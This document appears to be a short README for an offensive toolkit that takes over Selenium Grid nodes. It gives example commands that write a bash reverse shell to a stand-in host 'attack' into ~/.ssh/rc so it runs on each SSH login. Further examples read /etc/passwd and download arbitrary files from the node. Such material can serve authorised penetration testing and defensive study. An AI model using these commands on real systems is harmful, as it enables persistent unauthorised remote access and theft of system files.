# selenium-node-takeover-kit
A collection of selenium tests that might aid it takeover of a selenium node

## upload_file.py 
Example of adding a reverse shell on ssh login. 
    python3 examples/upload_file.py -u http://selenium-hub:4444/wd/hub -r ~/.ssh/rc -d "bash -c 'sh -i >& /dev/tcp/attack/4444 0>&1' &"

## download_file.py
Example of  concatenating the passwd file
    python3 examples/download_file.py -u http://selenium-hub:4444/wd/hub -r /etc/passwd
    
Example of downloading a small file
    python3 examples/download_file.py -u http://selenium-hub:4444/wd/hub -r /bin/ls -l ./test_ls
